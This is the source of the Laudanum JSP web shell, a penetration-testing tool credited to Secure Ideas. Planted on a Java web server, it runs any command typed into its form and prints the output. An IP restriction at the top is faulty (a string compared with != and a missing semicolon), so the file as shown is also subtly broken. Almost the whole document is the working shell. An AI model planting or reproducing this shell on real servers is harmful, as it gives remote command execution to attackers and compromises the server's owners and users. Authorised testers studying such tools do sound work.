<%@ page import="java.util.*,java.io.*"%>
<%

if (request.getRemoteAddr() != "4.4.4.4") {
	response.sendError(HttpServletResponse.SC_NOT_FOUND)
	return;
}

%>
<HTML>
<TITLE>Laudanum JSP Shell</TITLE>
<BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send"><br/>
If you use this against a Windows box you may need to prefix your command with cmd.exe /c
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</pre>
<hr/>
<address>
Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
Written by Tim Medin.<br/>
Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
</address>
</BODY></HTML>
